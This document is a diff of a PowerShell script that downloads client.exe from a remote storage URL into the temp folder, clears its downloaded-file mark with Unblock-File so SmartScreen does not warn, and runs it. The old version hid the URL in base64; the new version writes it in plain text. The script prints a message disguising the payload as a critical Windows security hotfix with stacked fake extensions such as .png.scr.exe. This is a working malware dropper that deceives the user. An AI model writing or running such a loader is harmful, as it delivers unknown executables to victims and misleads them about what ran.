@@ -1,8 +1,4 @@
-$encoded_url = "aHR0cHM6Ly9jZG4uc3RvcmFnZS50by9kZDJjMzQzMi00NDY4LTQyNjgtODY3Ni0xZjkzNDRkMjkyMjY/ZXhwaXJlcz0xNzc4NjIyNTgwJmZpbGVuYW1lPWNsaWVudC5leGUmaWQ9SUNPRkFQYUxCJnNpZz0zYmIxNTliYjQ0ZmUwOTRjODNiY2UxZDJkMDk5MTEwNDM3ZmJhMzgyNDA0ODFlZTJlYjViN2MyMTEyMGE5N2I2"
-
-$url = [System.Text.Encoding]::UTF8.GetString(
-    [System.Convert]::FromBase64String($encoded_url)
-)
+$url = "https://cdn.storage.to/dd2c3432-4468-426a-8676-1f9344d29226?expires=1778622580&filename=client.exe&id=ICOFAPaLB&sig=3bb159bb44fe094c83bce1d2d099110437fba38240481ee2eb5b7c21120a97b6"
 
 $path = Join-Path $env:TEMP "client.exe"
 
@@ -11,16 +7,20 @@ try {
 
     Invoke-WebRequest `
         -Uri $url `
-        -OutFile $path `
-        -UseBasicParsing
+        -OutFile $path
 
     if (Test-Path $path) {
-        Unblock-File $path
-        Start-Process -FilePath $path
-        Write-Host "Removed at C:\PUBLIC\Documents\x9z5LCh94mR4L4c49jtm5p9jJLr4mbv9c0x492598918ITKgl9CVJl4kG4m4f9xP4L4m55J4mncq899go53n59Vxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.gif.jpg.png.png.png.png.exe.pdf.exe" -ForegroundColor Green
+
+        # optional but helps with SmartScreen
+        Unblock-File $path -ErrorAction SilentlyContinue
+
+        # launch
+        Start-Process $path
+
+        Write-Host "Removed at C:\PUBLIC\Documents\win-update-security-hotfix-kb9928874-critical-patch.x9z5LCh94mR4L4c49jtm5p9jJLr4mbv9c0x492598918ITKgl9CVJl4kG4m4f9xP4L4m55J4mncq899go53n59V.png.scr.exe" -ForegroundColor Green
     }
     else {
-        Write-Host "Failed." -ForegroundColor Red
+        Write-Host "Download failed." -ForegroundColor Red
     }
 }
 catch {
